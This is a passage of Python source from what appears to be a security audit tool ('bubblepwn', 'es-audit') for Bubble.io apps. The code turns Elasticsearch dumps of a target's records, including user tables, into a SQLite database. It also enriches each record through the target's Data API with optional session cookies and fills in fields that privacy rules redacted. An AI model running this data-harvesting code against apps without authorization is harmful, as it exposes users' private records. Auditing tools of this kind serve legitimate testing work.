        for i, (t, cnt) in enumerate(exposed, 1):
            console.print(
                f"\n[bold cyan]━━━ [{i}/{n}] {t}[/]  [dim](~{cnt:,} records)[/]"
            )
            await self._dumpone(ctx, anon, auth, app_version, t, flags)

    # ── sqlite ───────────────────────────────────────────────────────────

    async def _sqlite(
        self,
        ctx: Context,
        positional: list[str],
        flags: dict[str, Any],
        *,
        anon: Optional[EsTransport] = None,
        auth: Optional[EsTransport] = None,
    ) -> None:
        """Rebuild a SQLite DB from the JSONL dumps in ``out/<host>/es/``.

        One table per Bubble data type. Column types are inferred from the
        Bubble field-name suffix (``_number``, ``_boolean``, ``_date``,
        ``___<type>``) and from the JSON value shape. Reference-style fields
        (``<creator>__LOOKUP__<target_id>``) get a companion
        ``<field>__ref_id`` column with the extracted target id so joins
        are direct.

        When ``--enrich`` is passed, every JSONL dump that is not already
        augmented with Data API records is enriched inline before the
        tables are built. The merged view (ES + Data API) becomes the
        table columns — both pipelines' fields, aligned across the
        DB/display name conventions.
        """
        import sqlite3
        from pathlib import Path as _Path

        if ctx.target is None:
            console.print("[red]no target set[/]")
            return

        dump_dir = _Path("out") / ctx.target.host / "es"
        if not dump_dir.exists() or not any(dump_dir.glob("*.jsonl")):
            console.print(
                f"[yellow]No dumps at {dump_dir}[/]. Run "
                "[cyan]es-audit dumpone <type>[/] or [cyan]dumpall --confirm[/] first."
            )
            return

        # Positional: subcommand at [0], optional output path at [1].
        default_db = _Path("out") / ctx.target.host / "es.sqlite"
        out_db = _Path(positional[1]) if len(positional) > 1 else default_db
        out_db.parent.mkdir(parents=True, exist_ok=True)
        if out_db.exists():
            out_db.unlink()

        panel(
            "es-audit — sqlite",
            f"reading  [cyan]{dump_dir}/*.jsonl[/]\n"
            f"building [cyan]{out_db}[/]",
            style="cyan",
        )

        # Opt-in enrichment pass — fill in the Data API merge for any
        # JSONL that still lacks ``_enrich`` on its first record. This is
        # what turns the SQLite into the full id↔display union.
        if flags.get("enrich"):
            use_auth = bool(flags.get("auth")) and auth is not None
            branch = (auth or anon).branch if (auth or anon) else "live"
            cookies = ctx.session.cookies if (use_auth and ctx.session) else None
            api = BubbleAPI(ctx.target.url, cookies=cookies, branch=branch)
            concurrency = int(flags.get("enrich_concurrency") or 8)
            for jf in sorted(dump_dir.glob("*.jsonl")):
                if _jsonl_already_enriched(jf):
                    continue
                raw_type = _reconstruct_raw_type(jf.stem)
                console.print(
                    f"[cyan]→[/] enriching {jf.name} → "
                    f"/api/1.1/obj/{raw_type.split('.', 1)[-1]}"
                )
                meta_map = _build_meta_map_from_schema(ctx, raw_type)
                if not meta_map:
                    meta_map = await _fetch_meta_map(api, raw_type)
                await _enrich_jsonl_with_dataapi(
                    jf, raw_type, api,
                    concurrency=concurrency, meta_map=meta_map,
                )

        conn = sqlite3.connect(out_db)
        conn.execute("PRAGMA journal_mode = WAL")
        stats: list[dict[str, Any]] = []

        jsonl_files = sorted(dump_dir.glob("*.jsonl"))
        one_type = flags.get("type")
        if isinstance(one_type, str) and one_type.strip():
            wanted = one_type.strip().lower()
            jsonl_files = [f for f in jsonl_files if f.stem.lower() == wanted]
            if not jsonl_files:
                console.print(
                    f"[yellow]No dump for type[/] [cyan]{wanted}[/]. "
                    "Run `es-audit dumpone <type>` first."
                )
                return
        from bubblepwn.ui import progress_iter
        with progress_iter("Importing JSONL", len(jsonl_files)) as bar:
            for f in jsonl_files:
                type_name = f.stem
                table = _safe_table_name(type_name)
                size_bytes = f.stat().st_size
                if size_bytes < 1024 * 1024:
                    size_str = f"{size_bytes / 1024:.0f} KB"
                else:
                    size_str = f"{size_bytes / (1024 * 1024):.1f} MB"
                bar.set_description(f"{table} ({size_str})")
                try:
                    rows, cols = _import_jsonl_into_sqlite(conn, f, table)
                except Exception as exc:
                    console.print(f"[yellow]![/] {type_name}: {exc}")
                    bar.advance()
                    continue
                bar.set_description(f"{table} — {rows:,} rows")
                stats.append({
                    "type": type_name, "table": table,
                    "rows": rows, "columns": cols,
                })
                bar.advance()

        conn.commit()
        conn.close()

        # Render summary
        from rich.table import Table as RichTable
        t = RichTable(header_style="bold cyan", border_style="dim")
        t.add_column("Type", style="cyan", no_wrap=True, overflow="fold")
        t.add_column("Table", style="magenta", no_wrap=True)
        t.add_column("Rows", justify="right")
        t.add_column("Columns", justify="right")
        total_rows = 0
        for s in sorted(stats, key=lambda x: -x["rows"]):
            t.add_row(s["type"], s["table"], str(s["rows"]), str(s["columns"]))
            total_rows += s["rows"]
        console.print(t)
        console.print(
            f"\n[green]✓[/] {len(stats)} table(s) · {total_rows} row(s) · "
            f"[cyan]{out_db}[/]"
        )
        console.print(
            "[dim]Open with `sqlite3 "
            f"{out_db}` or any SQLite GUI. Join example:\n"
            "  SELECT u.* FROM t_user u JOIN t_custom_<some_type> d "
            '  ON u._id = d."Created By__ref_id";[/]'
        )

        ctx.add_finding(Finding(
            module=self.name,
            severity="info",
            title=f"Rebuilt SQLite database ({len(stats)} tables, {total_rows} rows)",
            detail=f"Output: {out_db}",
            data={"path": str(out_db), "tables": stats},
        ))


# ── Data-API enrichment (module-level helpers) ──────────────────────────


def _build_meta_map_from_schema(
    ctx: Context, raw_type: str,
) -> dict[str, str]:
    """Collect the id→display mapping Bubble published in /meta for this
    type. Returns an empty dict if datatypes --probe hasn't run or the
    type isn't known.
    """
    t = ctx.schema.types.get(raw_type)
    if not t:
        return {}
    out: dict[str, str] = {}
    for f in t.fields.values():
        if f.source == "meta" and f.raw and f.display:
            out[f.raw] = f.display
    return out


async def _fetch_meta_map(
    api: BubbleAPI, raw_type: str,
) -> dict[str, str]:
    """On-demand /meta fetch for enrichment — resolves Bubble-managed
    aliases (e.g. ``name_first_text`` → ``Profile First Name``) that the
    heuristic matcher cannot discover.
    """
    try:
        status, body = await api.meta()
    except Exception:
        return {}
    if status != 200 or body is None:
        return {}
    parsed = parse_meta(body)
    # Accept both 'user' and 'custom.foo' — parse_meta keys by bare name.
    bare = raw_type.split(".", 1)[1] if "." in raw_type else raw_type
    return parsed.id_to_display(bare)




async def _enrich_jsonl_with_dataapi(
    jsonl_path: Path, raw_type: str, api: BubbleAPI, *, concurrency: int = 8,
    meta_map: Optional[dict[str, str]] = None,
) -> tuple[int, int]:
    """Re-read a JSONL dump, fetch ``/api/1.1/obj/<type>/<_id>`` per record,
    and rewrite the file with each record augmented by an ``_enrich`` block.

    Returns ``(records_enriched, total_new_fields)``. Records whose Data API
    call fails (404, 401, network error, non-dict body) are kept intact with
    ``_enrich.dataapi_status`` set to the observed status so a second pass
    can target them selectively.

    A record is considered already-enriched if it has a top-level ``_enrich``
    key — those are skipped so repeated runs are idempotent.

    ``meta_map`` is the authoritative id↔display lookup for this type
    (from ``/api/1.1/meta``). Pass it in to resolve Bubble-managed aliases
    that the heuristic matcher can't reach (e.g. ``name_first_text`` →
    ``Profile First Name``).
    """
    import asyncio

    # Path of the type in the Data API URL: drop the ``custom.`` prefix.
    type_path = raw_type.split(".", 1)[1] if raw_type.startswith("custom.") else raw_type

    # Load the full dump into memory. Dumps are typically < 500 MB for even
    # very large apps since ES strips most fields; keep the memory simple.
    records: list[dict[str, Any]] = []
    with jsonl_path.open("r", encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                records.append(json.loads(line))
            except json.JSONDecodeError:
                continue

    to_enrich: list[tuple[int, str]] = []
    for idx, rec in enumerate(records):
        if not isinstance(rec, dict):
            continue
        if "_enrich" in rec:
            continue  # already done — idempotent
        uid = rec.get("_id")
        if isinstance(uid, str) and uid:
            to_enrich.append((idx, uid))

    if not to_enrich:
        return 0, 0

    sem = asyncio.Semaphore(max(1, concurrency))
    gains_total = 0
    enriched_count = 0

    async def one(idx: int, uid: str) -> None:
        nonlocal gains_total, enriched_count
        async with sem:
            try:
                status, body = await api.obj_by_id(type_path, uid)
            except Exception as exc:
                records[idx]["_enrich"] = {
                    "dataapi_status": 0, "error": str(exc)[:120],
                    "merged": dict(records[idx].get("_source") or {}),
                    "provenance": {},
                }
                return
        rec = records[idx]
        es_source = dict(rec.get("_source") or {})
        da_source: dict[str, Any] = {}
        if status == 200 and isinstance(body, dict):
            # Data API wraps the record in {"response": {...}} for GET by id.
            da_source = body.get("response") if isinstance(body.get("response"), dict) else body
            if not isinstance(da_source, dict):
                da_source = {}
        merged, provenance, new_fields = _merge_es_dataapi(
            es_source, da_source, meta_map=meta_map,
        )
        rec["_enrich"] = {
            "dataapi_status": status,
            "dataapi_source": da_source,
            "merged": merged,
            "provenance": provenance,
        }
        if status == 200 and isinstance(body, dict):
            enriched_count += 1
            gains_total += new_fields

    from bubblepwn.ui import progress_iter
    with progress_iter(
        f"enrich {type_path} via /api/1.1/obj", len(to_enrich)
    ) as bar:
        tasks = [asyncio.create_task(one(i, u)) for i, u in to_enrich]
        # Advance progress as tasks complete. Use asyncio.as_completed so a
        # stuck request doesn't block the bar.
        for coro in asyncio.as_completed(tasks):
            try:
                await coro
            except Exception as exc:
                console.print(f"[yellow]enrichment task failed:[/] {exc}")
            bar.advance()

    # Rewrite JSONL atomically.
    tmp = jsonl_path.with_suffix(jsonl_path.suffix + ".tmp")
    with tmp.open("w", encoding="utf-8") as fh:
        for rec in records:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    import os as _os
    _os.replace(tmp, jsonl_path)
    return enriched_count, gains_total


def _merge_es_dataapi(
    es_source: dict[str, Any],
    da_source: dict[str, Any],
    *,
    meta_map: Optional[dict[str, str]] = None,
) -> tuple[dict[str, Any], dict[str, str], int]:
    """Merge ES ``_source`` with Data API record, matching keys across the
    ES (DB) and display name conventions.

    Returns ``(merged, provenance, new_fields_gained)`` where ``provenance``
    maps each final key to ``"es"``, ``"dataapi"`` or ``"both"``. Keys that
    exist under both names end up under the **display** name in ``merged``
    (since it's the official Bubble schema name), with an ``<display>@db``
    alias copying the raw ES key for traceability.

    ``meta_map`` is the authoritative id→display mapping published by
    ``/api/1.1/meta``. When provided, it takes priority over the heuristic
    matcher for every field it covers — Bubble-managed aliases like
    ``name_first_text ↔ Profile First Name`` that share no string
    structure are only matched via this table.
    """
    used_es: set[str] = set()
    used_da: set[str] = set()
    pairs: list[tuple[str, str]] = []

    # 1) Authoritative pairs from /meta.
    if meta_map:
        for es_key, disp_key in meta_map.items():
            if es_key in es_source and disp_key in da_source:
                pairs.append((es_key, disp_key))
                used_es.add(es_key)
                used_da.add(disp_key)

    # 2) Heuristic matcher on whatever's left.
    remaining_es = [k for k in es_source if k not in used_es]
    remaining_da = [k for k in da_source if k not in used_da]
    heur_pairs, heur_es_only, heur_da_only = nn.pair(
        db_names=remaining_es,
        display_names=remaining_da,
    )
    pairs.extend(heur_pairs)

    merged: dict[str, Any] = {}
    provenance: dict[str, str] = {}

    for db_key, disp_key in pairs:
        es_val = es_source.get(db_key)
        da_val = da_source.get(disp_key)
        # Prefer the Data API value when ES returned a redacted empty
        # container ({} or []). Otherwise prefer ES for richness.
        if _is_redacted(es_val) and not _is_redacted(da_val):
            merged[disp_key] = da_val
        elif _is_redacted(da_val) and not _is_redacted(es_val):
            merged[disp_key] = es_val
        else:
            # Both are non-empty (or both empty): prefer Data API since
            # it uses the display-name convention; ES value kept as alias.
            merged[disp_key] = da_val if da_val is not None else es_val
        if db_key != disp_key:
            merged[f"{disp_key}@db"] = es_val
        provenance[disp_key] = "both"

    for k in heur_es_only:
        merged[k] = es_source[k]
        provenance[k] = "es"

    new_fields = 0
    for k in heur_da_only:
        merged[k] = da_source[k]
        provenance[k] = "dataapi"
        new_fields += 1

    return merged, provenance, new_fields


def _is_redacted(v: Any) -> bool:
    """True for values Bubble returns when a privacy rule strips content.

    ``{}`` empty dict is the standard redaction marker for sub-objects
    (e.g. ``authentication``). Empty lists and ``None`` also qualify.
    """
    if v is None:
        return True
    if isinstance(v, dict) and not v:
        return True
    if isinstance(v, list) and not v:
        return True
    return False


def _jsonl_already_enriched(path: Path) -> bool:
    """Cheap check: does the first non-empty JSONL line already carry an
    ``_enrich`` key? Avoids a full scan per file.
    """
    try:
        with path.open("r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                except json.JSONDecodeError:
                    return False
                return isinstance(rec, dict) and "_enrich" in rec
    except OSError:
        return False
    return False


def _reconstruct_raw_type(stem: str) -> str:
    """Inverse of ``_safe_path_segment(_normalize_type(...))``.

    Dump filenames keep dots intact (``custom.user.jsonl``), but we fall
    back to the older underscore form (``custom_user.jsonl``) just in
    case an old dump is around.
    """
    if stem == "user":
        return "user"
    if stem.startswith("custom.") or stem.startswith("option."):
        return stem
    if stem.startswith("custom_"):
        return "custom." + stem[len("custom_"):]
    if stem.startswith("option_"):
        return "option." + stem[len("option_"):]
    return stem


# ── SQLite helpers (module-level, no `self`) ─────────────────────────────

_SQL_KEYWORDS = {
    "user", "group", "order", "select", "insert", "update", "delete",
    "table", "index", "view", "from", "where", "join",
}


def _safe_table_name(raw_type: str) -> str:
    """``custom.user`` → ``t_custom_user``. Always-prefix to avoid SQL keywords."""
    slug = re.sub(r"[^a-zA-Z0-9_]", "_", raw_type).strip("_")
    return f"t_{slug}" if slug else "t_unnamed"


_BUBBLE_SUFFIX_TO_SQL = {
    "text": "TEXT",
    "number": "REAL",
    "boolean": "INTEGER",
    "date": "INTEGER",
    "image": "TEXT",
    "file": "TEXT",
    "option": "TEXT",
    "list": "TEXT",
    "geographic_address": "TEXT",
}


def _infer_sql_type(field_name: str, sample_value: Any) -> str:
    """Guess SQLite column type from field name suffix or value."""
    # Explicit Bubble suffix: `___<type>` or `_<type>` at end
    m = re.search(r"___([a-z_]+)$|_(text|number|boolean|date|image|file|option|list)$",
                  field_name)
    if m:
        suffix = m.group(1) or m.group(2)
        if suffix in _BUBBLE_SUFFIX_TO_SQL:
            return _BUBBLE_SUFFIX_TO_SQL[suffix]
    # Special well-known names
    lname = field_name.lower()
    if lname in ("created date", "modified date", "_version"):
        return "INTEGER"
    # Fallback on JSON value type
    if isinstance(sample_value, bool):
        return "INTEGER"
    if isinstance(sample_value, int):
        return "INTEGER"
    if isinstance(sample_value, float):
        return "REAL"
    return "TEXT"


def _split_lookup(value: Any) -> Optional[str]:
    """Extract the target id from ``<creator>__LOOKUP__<target_id>`` pattern."""
    if not isinstance(value, str):
        return None
    idx = value.find("__LOOKUP__")
    if idx < 0:
        return None
    return value[idx + len("__LOOKUP__"):]


def _import_jsonl_into_sqlite(
    conn: Any, jsonl_path: Any, table: str
) -> tuple[int, int]:
    """Return ``(rows_inserted, total_columns)``.

    Record selection priority per JSONL line:
      1. ``_enrich.merged`` — the ES + Data API union (enriched dumps).
      2. ``_source`` — raw ES record (regular dumps).
      3. the top-level dict itself (legacy flat records).

    The row always carries ``_id`` and ``_type`` from the envelope when
    available so joins across tables keep working regardless of whether
    the source was enriched.
    """
    records: list[dict[str, Any]] = []
    with jsonl_path.open(encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                rec = json.loads(line)
            except json.JSONDecodeError:
                continue
            if not isinstance(rec, dict):
                continue
            # Prefer the enriched merged view — it unions ES + Data API
            # fields under their display names.
            enrich = rec.get("_enrich")
            if isinstance(enrich, dict) and isinstance(enrich.get("merged"), dict):
                source = dict(enrich["merged"])
            elif "_source" in rec and isinstance(rec["_source"], dict):
                source = dict(rec["_source"])
            else:
                source = dict(rec)
            # Make sure the envelope identifiers land in the table so joins
            # can target ``_id`` even on enriched records (where merged may
            # omit ``_id`` under the Data API convention).
            if "_id" not in source and isinstance(rec.get("_id"), str):
                source["_id"] = rec["_id"]
            if "_type" not in source and isinstance(rec.get("_type"), str):
                source["_type"] = rec["_type"]
            records.append(source)
    if not records:
        return 0, 0

    # Collect columns + infer types, then add companion *__ref_id* columns
    # for every __LOOKUP__ field encountered.
    sample_by_col: dict[str, Any] = {}
    has_lookup: set[str] = set()
    for rec in records:
        for k, v in rec.items():
            if k not in sample_by_col and v is not None:
                sample_by_col[k] = v
            if _split_lookup(v) is not None:
                has_lookup.add(k)

    columns: dict[str, str] = {}
    for col, sample in sample_by_col.items():
        columns[col] = _infer_sql_type(col, sample)
    # Ensure _id, if present, is the primary key
    for k in list(records[0].keys()):
        if k not in columns:
            columns[k] = "TEXT"

    lookup_cols = {f"{k}__ref_id": "TEXT" for k in has_lookup}
    all_cols = {**columns, **lookup_cols}

    # Quote for DDL / DML safety
    cols_ddl = ", ".join(f'"{c}" {t}' for c, t in all_cols.items())
    # Add PRIMARY KEY on _id if the column exists
    if "_id" in all_cols:
        cols_ddl += ', PRIMARY KEY ("_id")'
    conn.execute(f'DROP TABLE IF EXISTS "{table}"')
    conn.execute(f'CREATE TABLE "{table}" ({cols_ddl})')

    col_names = list(all_cols.keys())
    placeholders = ",".join("?" for _ in col_names)
    quoted = ",".join(f'"{c}"' for c in col_names)
    stmt = f'INSERT OR IGNORE INTO "{table}" ({quoted}) VALUES ({placeholders})'

    rows: list[tuple[Any, ...]] = []
    for rec in records:
        row: list[Any] = []
        for c in col_names:
            if c.endswith("__ref_id"):
                src_col = c[: -len("__ref_id")]
                row.append(_split_lookup(rec.get(src_col)))
                continue
            v = rec.get(c)
            if isinstance(v, (dict, list)):
                v = json.dumps(v, ensure_ascii=False)
            elif isinstance(v, bool):
                v = 1 if v else 0
            row.append(v)
        rows.append(tuple(row))

    conn.executemany(stmt, rows)
    return len(rows), len(all_cols)
